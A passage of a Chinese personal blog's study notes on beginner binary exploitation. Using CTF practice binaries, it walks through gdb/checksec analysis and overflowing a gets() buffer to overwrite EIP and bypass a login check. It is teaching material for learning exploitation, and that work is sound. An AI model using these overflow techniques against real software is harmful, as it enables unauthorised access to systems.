<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="keywords" content="Hexo Theme Redefine"><meta name="author" content="The Redefine Team"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="canonical" href="https://brocademaple.github.io/2024/09/22/cs_notes/pwn/【pvvn】可能是学习笔记吧/"><meta name="robots" content="index,follow"><meta name="googlebot" content="index,follow"><meta name="revisit-after" content="1 days"><meta name="description" content="¶目录 [TOC]  240922 用简单易懂的话语来快速入门windows缓冲区溢出_vulnserver-CSDN博客   因为kali环境没好所以先放着【画饼数：1】  PWN入门（1）基础知识和环境设置-CSDN博客   内容基本来源博客，仅cv存储自己看  ¶所需环境  gdb √ pwndbg √ pwntools √  ¶缓冲区溢出   在进行缓冲区溢出攻击后，缓冲区（buffer"><meta property="og:type" content="article"><meta property="og:title" content="【Pvvn】可能是学习笔记吧"><meta property="og:url" content="https://brocademaple.github.io/2024/09/22/CS_Notes/PWN/%E3%80%90Pvvn%E3%80%91%E5%8F%AF%E8%83%BD%E6%98%AF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E5%90%A7/index.html"><meta property="og:site_name" content="私の宝庫です"><meta property="og:description" content="¶目录 [TOC]  240922 用简单易懂的话语来快速入门windows缓冲区溢出_vulnserver-CSDN博客   因为kali环境没好所以先放着【画饼数：1】  PWN入门（1）基础知识和环境设置-CSDN博客   内容基本来源博客，仅cv存储自己看  ¶所需环境  gdb √ pwndbg √ pwntools √  ¶缓冲区溢出   在进行缓冲区溢出攻击后，缓冲区（buffer"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://brocademaple.github.io/2024/09/22/CS_Notes/PWN/%E3%80%90Pvvn%E3%80%91%E5%8F%AF%E8%83%BD%E6%98%AF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E5%90%A7/image-20240922190048977.png"><meta property="og:image" content="https://brocademaple.github.io/2024/09/22/CS_Notes/PWN/%E3%80%90Pvvn%E3%80%91%E5%8F%AF%E8%83%BD%E6%98%AF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E5%90%A7/image-20240922195822198.png"><meta property="og:image" content="https://brocademaple.github.io/2024/09/22/CS_Notes/PWN/%E3%80%90Pvvn%E3%80%91%E5%8F%AF%E8%83%BD%E6%98%AF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E5%90%A7/image-20240922195923832.png"><meta property="og:image" content="https://brocademaple.github.io/2024/09/22/CS_Notes/PWN/%E3%80%90Pvvn%E3%80%91%E5%8F%AF%E8%83%BD%E6%98%AF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E5%90%A7/image-20240922195956903.png"><meta property="og:image" content="https://brocademaple.github.io/2024/09/22/CS_Notes/PWN/%E3%80%90Pvvn%E3%80%91%E5%8F%AF%E8%83%BD%E6%98%AF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E5%90%A7/image-20240922200242728.png"><meta property="article:published_time" content="2024-09-21T16:00:00.000Z"><meta property="article:modified_time" content="2024-09-27T13:27:40.061Z"><meta property="article:author" content="brocademaple"><meta property="article:tag" content="CS Notes"><meta property="article:tag" content="Pwn"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://brocademaple.github.io/2024/09/22/CS_Notes/PWN/%E3%80%90Pvvn%E3%80%91%E5%8F%AF%E8%83%BD%E6%98%AF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E5%90%A7/image-20240922190048977.png"><link rel="icon" type="image/png" href="/images/redefine-favicon.svg" sizes="192x192"><link rel="apple-touch-icon" sizes="180x180" href="/images/redefine-favicon.svg"><meta name="theme-color" content="#A31F34"><link rel="shortcut icon" href="/images/redefine-favicon.svg"><title>【Pvvn】可能是学习笔记吧 - Theme Redefine</title><link rel="stylesheet" href="/fonts/Chillax/chillax.css"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/assets/build/styles.css"><link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css"><link rel="stylesheet" href="/fonts/Geist/geist.css"><script id="hexo-configurations">window.config={hostname:"brocademaple.github.io",root:"/",language:"zh-CN",path:"search.xml"},window.theme={articles:{style:{font_size:"16px",line_height:1.5,image_border_radius:"14px",image_alignment:"center",image_caption:!1,link_icon:!0,title_alignment:"left",headings_top_spacing:{h1:"3.2rem",h2:"2.4rem",h3:"1.9rem",h4:"1.6rem",h5:"1.4rem",h6:"1.3rem"}},word_count:{enable:!0,count:!0,min2read:!0},author_label:{enable:!0,auto:!1,list:[]},code_block:{copy:!0,style:"mac",highlight_theme:{light:"github",dark:"vs2015"},font:{enable:!1,family:null,url:null}},toc:{enable:!0,max_depth:3,number:!1,expand:!0,init_open:!0},copyright:{enable:!0,default:"cc_by_nc_sa"},lazyload:!0,recommendation:{enable:!1,title:"推荐阅读",limit:3,mobile_limit:2,placeholder:"/images/wallhaven-wqery6-light.webp",skip_dirs:[]}},colors:{primary:"#A31F34",secondary:null,default_mode:"light"},global:{fonts:{chinese:{enable:!1,family:null,url:null},english:{enable:!1,family:null,url:null},title:{enable:!1,family:null,url:null}},content_max_width:"1000px",sidebar_width:"210px",hover:{shadow:!0,scale:!1},scroll_progress:{bar:!1,percentage:!0},website_counter:{url:"https://cn.vercount.one/js",enable:!0,site_pv:!0,site_uv:!0,post_pv:!0},single_page:!0,preloader:{enable:!1,custom_message:null},open_graph:!0,google_analytics:{enable:!1,id:null}},home_banner:{enable:!0,style:"fixed",image:{light:"/images/wallhaven-wqery6-light.webp",dark:"/images/wallhaven-wqery6-dark.webp"},title:"Theme Redefine",subtitle:{text:["云淡风轻近午天，傍花随柳过前川","青山不墨千秋画，绿水无弦万古琴","同来不得同归去，故国逢春一寂寥"],hitokoto:{enable:!1,show_author:!1,api:"https://v1.hitokoto.cn"},typing_speed:100,backing_speed:80,starting_delay:500,backing_delay:1500,loop:!0,smart_backspace:!0},text_color:{light:"#fff",dark:"#d1d1b6"},text_style:{title_size:"2.8rem",subtitle_size:"1.5rem",line_height:1.2},custom_font:{enable:!1,family:null,url:null},social_links:{enable:!1,style:"default",links:{github:null,instagram:null,zhihu:null,twitter:null,email:null},qrs:{weixin:null}}},plugins:{feed:{enable:!1},aplayer:{meting:!0,enable:!1,type:"fixed",audios:[{name:null,artist:null,url:null,cover:null,lrc:null},{name:"Something Just Like This",artist:"Coldplay",url:"https://evan.beee.top/music/Something%20Just%20Like%20This%20-%20The%20Chainsmokers%E3%80%81Coldplay.mp3",cover:"https://evan.beee.top/music/covers/Something_Just_Like_This.png"}]},mermaid:{enable:!1,version:"9.3.0"}},version:"2.7.1",navbar:{auto_hide:!1,color:{left:"#f78736",right:"#367df7",transparency:35},width:{home:"1200px",pages:"1000px"},links:{Home:{path:"/",icon:"fa-regular fa-house"},Archives:{path:"/archives",icon:"fa-solid fa-archive"},Categories:{path:"/categories",icon:"fa-solid fa-list"},Tags:{path:"/tags/",icon:"fa-solid fa-tags"},Friends:{path:"/links/",icon:"fa-solid fa-user-group"},About:{icon:"fa-regular fa-user",submenus:{Me:"/aboutMe",Github:"https://github.com/brocademaple"}}},search:{enable:!1,preload:!0}},page_templates:{friends_column:2,tags_style:"blur"},home:{sidebar:{enable:!0,position:"left",first_item:"menu",announcement:null,show_on_mobile:!0,links:null},article_date_format:"auto",excerpt_length:200,categories:{enable:!0,limit:3},tags:{enable:!0,limit:3}},footerStart:"2022/8/17 11:45:14"},window.lang_ago={second:"%s 秒前",minute:"%s 分钟前",hour:"%s 小时前",day:"%s 天前",week:"%s 周前",month:"%s 个月前",year:"%s 年前"},window.data={masonry:!1}</script><link rel="stylesheet" href="/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/fontawesome/brands.min.css"><link rel="stylesheet" href="/fontawesome/solid.min.css"><link rel="stylesheet" href="/fontawesome/regular.min.css"><meta name="generator" content="Hexo 7.2.0"></head><body><div class="progress-bar-container"><span class="pjax-progress-bar"></span></div><main class="page-container" id="swup"><div class="main-content-container"><div class="main-content-header"><header class="navbar-container px-6 md:px-12"><div class="navbar-content"><div class="left"><a class="logo-title" href="/">Theme Redefine</a></div><div class="right"><div class="desktop"><ul class="navbar-list"><li class="navbar-item"><a href="/"><i class="fa-regular fa-house fa-fw"></i> 首页</a></li><li class="navbar-item"><a href="/archives"><i class="fa-solid fa-archive fa-fw"></i> 归档</a></li><li class="navbar-item"><a href="/categories"><i class="fa-solid fa-list fa-fw"></i> 分类</a></li><li class="navbar-item"><a href="/tags/"><i class="fa-solid fa-tags fa-fw"></i> 标签</a></li><li class="navbar-item"><a href="/links/"><i class="fa-solid fa-user-group fa-fw"></i> 友情链接</a></li><li class="navbar-item"><a class="has-dropdown" href="#" onclick="&#34;return" false;&#34;><i class="fa-regular fa-user fa-fw"></i> 关于 <i class="fa-solid fa-chevron-down fa-fw"></i></a><ul class="sub-menu"><li><a href="/aboutMe">ME</a></li><li><a target="_blank" rel="noopener" href="https://github.com/brocademaple">GITHUB</a></li></ul></li></ul></div><div class="mobile"><div class="icon-item navbar-bar"><div class="navbar-bar-middle"></div></div></div></div></div><div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between"><ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start"><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" href="/"><span>首页 </span><i class="fa-regular fa-house fa-sm fa-fw"></i></a></li><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" href="/archives"><span>归档 </span><i class="fa-solid fa-archive fa-sm fa-fw"></i></a></li><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" href="/categories"><span>分类 </span><i class="fa-solid fa-list fa-sm fa-fw"></i></a></li><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" href="/tags/"><span>标签 </span><i class="fa-solid fa-tags fa-sm fa-fw"></i></a></li><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" href="/links/"><span>友情链接 </span><i class="fa-solid fa-user-group fa-sm fa-fw"></i></a></li><li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full"><div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" navbar-data-toggle="submenu-About"><span>关于 </span><i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i></div><div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About"><div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl"><a class="text-third-text-color text-xl" href="/aboutMe">ME</a></div><div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl"><a class="text-third-text-color text-xl" target="_blank" rel="noopener" href="https://github.com/brocademaple">GITHUB</a></div></div></li></ul><div class="statistics flex justify-around my-2.5"><a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags"><div class="number text-2xl sm:text-xl text-second-text-color font-semibold">34</div><div class="label text-third-text-color text-sm">标签</div></a><a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories"><div class="number text-2xl sm:text-xl text-second-text-color font-semibold">33</div><div class="label text-third-text-color text-sm">分类</div></a><a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives"><div class="number text-2xl sm:text-xl text-second-text-color font-semibold">77</div><div class="label text-third-text-color text-sm">文章</div></a></div></div><div class="window-mask"></div></header></div><div class="main-content-body"><div class="main-content"><div class="post-page-container flex relative justify-between box-border w-full h-full"><div class="article-content-container"><div class="article-title relative w-full"><div class="w-full flex items-center pt-6 justify-start"><h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">【Pvvn】可能是学习笔记吧</h1></div></div><div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8"><div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]"><img src="/images/redefine-avatar.svg"></div><div class="info flex flex-col justify-between"><div class="author flex items-center"><span class="name text-default-text-color text-lg font-semibold">The Redefine Team</span> <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv5</span></div><div class="meta-info"><div class="article-meta-info"><span class="article-date article-meta-item"><i class="fa-regular fa-pen-fancy"></i>&nbsp; <span class="desktop">2024-09-22</span> <span class="mobile">2024-09-22</span> <span class="hover-info">创建</span> </span><span class="article-date article-meta-item"><i class="fa-regular fa-wrench"></i>&nbsp; <span class="desktop">2024-09-27 21:27:40</span> <span class="mobile">2024-09-27 21:27:40</span> <span class="hover-info">更新</span> </span><span class="article-categories article-meta-item"><i class="fa-regular fa-folders"></i>&nbsp;<ul><li><a href="/categories/notes/">notes</a>&nbsp;</li><li>></li><li><a href="/categories/notes/Pwn-notes/">Pwn notes</a>&nbsp;</li></ul></span><span class="article-tags article-meta-item"><i class="fa-regular fa-tags"></i>&nbsp;<ul><li><a href="/tags/CS-Notes/">CS Notes</a>&nbsp;</li><li>| <a href="/tags/Pwn/">Pwn</a>&nbsp;</li></ul></span><span class="article-wordcount article-meta-item"><i class="fa-regular fa-typewriter"></i>&nbsp;<span>9.5k 字</span> </span><span class="article-min2read article-meta-item"><i class="fa-regular fa-clock"></i>&nbsp;<span>46 分钟</span> </span><span class="article-pv article-meta-item"><i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span></span></div></div></div></div><div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8"><hr><h2 id="目录"><a class="header-anchor" href="#目录">¶</a>目录</h2><p>[TOC]</p><hr><h1>240922</h1><p><a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45894840/article/details/123373180?spm=1001.2014.3001.5502">用简单易懂的话语来快速入门windows缓冲区溢出_vulnserver-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 因为kali环境没好所以先放着【画饼数：1】</p><hr><p><a class="link" target="_blank" rel="noopener" href="https://ba1ma0.blog.csdn.net/article/details/126751701?spm=1001.2014.3001.5502">PWN入门（1）基础知识和环境设置-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><blockquote><p>内容基本来源博客，仅cv存储自己看</p></blockquote><h2 id="所需环境"><a class="header-anchor" href="#所需环境">¶</a>所需环境</h2><ul><li>gdb √</li><li>pwndbg √</li><li>pwntools √</li></ul><h2 id="缓冲区溢出"><a class="header-anchor" href="#缓冲区溢出">¶</a>缓冲区溢出</h2><p><img lazyload src="/images/loading.svg" data-src="image-20240922190048977.png" alt="Buffer Overflow Attack"></p><ul><li>在进行缓冲区溢出攻击后，缓冲区（buffer）里的字符向上溢出到了返回函数，从而导致程序错误</li><li>还可以利用这个返回地址达到远程入侵的目的</li></ul><h3 id="动态调试"><a class="header-anchor" href="#动态调试">¶</a>动态调试</h3><ul><li>要下载的库：<code>https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101</code></li></ul><h4 id="gets函数"><a class="header-anchor" href="#gets函数">¶</a>gets函数</h4><ul><li>永远不要使用gets函数，因为如果事先不知道数据，gets将就无法判断读取多少个字符</li><li>因为gets将继续存储字符当超过缓冲区的末端，使用它是极其危险的，它会破坏计算机安全</li><li>请改用fgets。</li></ul><h4 id="程序信息"><a class="header-anchor" href="#程序信息">¶</a>程序信息</h4><ul><li><p>查看编译后的文件信息</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file vuln</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file vuln</span><br><span class="line"></span><br><span class="line">--&gt; vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=40bfd0a2a6007a83be654c0626aedb3bc95a133f, <span class="keyword">for</span> GNU/Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--&gt; 这是一个32位的可执行程序</span><br><span class="line">--&gt; intel x86架构</span><br><span class="line">--&gt; 动态链接</span><br><span class="line">--&gt; 没有开启stripped，意思是如果我们用gdb去调试这个程序，可以看到函数名称，可以更方便的分析程序</span><br><span class="line">--&gt; 链接库地址为/lib/ld-linux.so.2</span><br></pre></td></tr></table></figure></div></li><li><p>使用<code>checksec</code> 工具可以查看程序更详细的信息</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/xaut/Desktop/baimaoTutorial/crypto-cat-ctf/pwn/binary_exploitation_101/00-intro_setup_basics/vuln&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">32位程序</span><br><span class="line">部分RELRO，基本上所有程序都默认的有这个</span><br><span class="line">没有开启栈保护</span><br><span class="line">未启用nx，nx：数据执行</span><br><span class="line">没有pie，意思是程序的内存空间不会被随机化</span><br><span class="line">有读，写，和执行的段，意思是我们可以在程序里写入shellcode</span><br></pre></td></tr></table></figure></div></li><li><p>尝试执行程序</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">chmod +x vuln</span><br><span class="line">./vuln</span><br><span class="line"></span><br><span class="line">Give me data plz: </span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">[1]    27961 segmentation fault (core dumped)  ./vuln</span><br></pre></td></tr></table></figure></div></li></ul><h4 id="使用gdb调试程序"><a class="header-anchor" href="#使用gdb调试程序">¶</a>使用gdb调试程序</h4><ul><li>使用gdb来动态调试程序</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb vuln</span><br></pre></td></tr></table></figure></div><ul><li>查看程序里所有调用的函数</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info functions</span><br></pre></td></tr></table></figure></div><ul><li>查看主函数<code>main</code>的汇编代码</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disassemble main</span><br></pre></td></tr></table></figure></div><ul><li>在<code>main</code>函数开头下一个断点便于调试【程序运行到断点处会停下来】，<code>run</code>运行程序</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b main</span><br><span class="line">run  </span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="image-20240922195822198.png" alt="image-20240922195822198"></p><ul><li>第一段是显示了寄存器里的所有内容，寄存器是内存中非常靠近cpu的区域，因此cpu可以快速访问它们，但是在这些寄存器里面能存储的东西非常有限</li></ul><p><img lazyload src="/images/loading.svg" data-src="image-20240922195923832.png" alt="image-20240922195923832"></p><ul><li>第二段是当前程序停下来的位置和程序的汇编代码地址</li></ul><p><img lazyload src="/images/loading.svg" data-src="image-20240922195956903.png" alt="image-20240922195956903"></p><ul><li><p>第三段是查看当前堆栈里的内容</p></li><li><p>执行下一个汇编指令：<code>next</code>或<code>n</code></p></li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">next</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="image-20240922200242728.png" alt="image-20240922200242728"></p><ul><li>输入一大堆<code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</code>，发现寄存器的值都被<code>a</code>覆盖</li><li>最重要的是<code>EIP</code>这个寄存器<ul><li>是程序的指针，指针就是寻找地址的，指到什么地址，就会运行该地址的参数</li><li>控制了这个指针，就能控制整个程序的运行</li></ul></li></ul><h3 id="静态调试"><a class="header-anchor" href="#静态调试">¶</a>静态调试</h3><blockquote><p>了解一下</p></blockquote><ul><li>在linux里，我们可以使用ghidra这个工具来静态调试程序<br>下载地址：</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/NationalSecurityAgency/ghidra</span><br></pre></td></tr></table></figure></div><ul><li>相关文章（Ghidra逆向分析工具使用与实战）：</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/qq_45894840/article/details/124556441?spm=1001.2014.3001.5502</span><br></pre></td></tr></table></figure></div><hr><p><a class="link" target="_blank" rel="noopener" href="https://ba1ma0.blog.csdn.net/article/details/126759579?spm=1001.2014.3001.5502">PWN入门（2）利用缓冲区溢出绕过登录和第一个PwnTools脚本_pwn脚本-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><blockquote><p>内容基本来源博客，仅cv存储自己看</p></blockquote><h3 id="利用缓冲区溢出绕过登录"><a class="header-anchor" href="#利用缓冲区溢出绕过登录">¶</a>利用缓冲区溢出绕过登录</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">chmod +x login</span><br><span class="line">./login    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Enter admin password: </span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">Incorrect Password!</span><br><span class="line">Successfully logged in as Admin (authorised=1633771873) :)</span><br><span class="line">[1]    32595 segmentation fault (core dumped)  ./login</span><br></pre></td></tr></table></figure></div><ul><li><p>用ltrace来跟踪进程调用库函数的情况</p><blockquote><p>这条命令会追踪 <code>./login</code> 程序执行过程中调用的所有动态库函数，并显示函数的名称、参数和返回值</p></blockquote></li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ltrace ./login</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">./login</span><br><span class="line">Enter admin password: </span><br><span class="line">pass</span><br><span class="line">Correct Password!</span><br><span class="line">Successfully logged in as Admin (authorised=1) :)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">./login</span><br><span class="line">Enter admin password: </span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">Incorrect Password!</span><br><span class="line">Successfully logged in as Admin (authorised=1633771873) :)</span><br><span class="line">[1]    33436 segmentation fault (core dumped)  ./login</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><ul><li><p>程序报错，授权号码也变得很大</p></li><li><p>输入正确的密码时，授权号码为1</p></li><li><p>一个一个字符测试程序的缓冲区边界</p></li><li><p>查看源代码</p></li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim login.c</span><br></pre></td></tr></table></figure></div><h4 id="静态分析"><a class="header-anchor" href="#静态分析">¶</a>静态分析</h4><ul><li>ghidra</li></ul><h4 id="动态分析"><a class="header-anchor" href="#动态分析">¶</a>动态分析</h4><ul><li>用<code>gdb</code>打开<code>login</code></li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb login</span><br></pre></td></tr></table></figure></div><ul><li>查看程序里调用的函数</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">gef➤  info functions</span><br><span class="line">All defined functions:</span><br><span class="line"></span><br><span class="line">Non-debugging symbols:</span><br><span class="line">0x08049000  _init</span><br><span class="line">0x08049030  strcmp@plt</span><br><span class="line">0x08049040  printf@plt</span><br><span class="line">0x08049050  gets@plt</span><br><span class="line">0x08049060  puts@plt</span><br><span class="line">0x08049070  __libc_start_main@plt</span><br><span class="line">0x08049080  _start</span><br><span class="line">0x080490c0  _dl_relocate_static_pie</span><br><span class="line">0x080490d0  __x86.get_pc_thunk.bx</span><br><span class="line">0x080490e0  deregister_tm_clones</span><br><span class="line">0x08049120  register_tm_clones</span><br><span class="line">0x08049160  __do_global_dtors_aux</span><br><span class="line">0x08049190  frame_dummy</span><br><span class="line">0x08049192  main</span><br><span class="line">0x08049260  __libc_csu_init</span><br><span class="line">0x080492c0  __libc_csu_fini</span><br><span class="line">0x080492c1  __x86.get_pc_thunk.bp</span><br><span class="line">0x080492c8  _fini</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><ul><li>查看main函数的汇编代码</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disassemble main</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 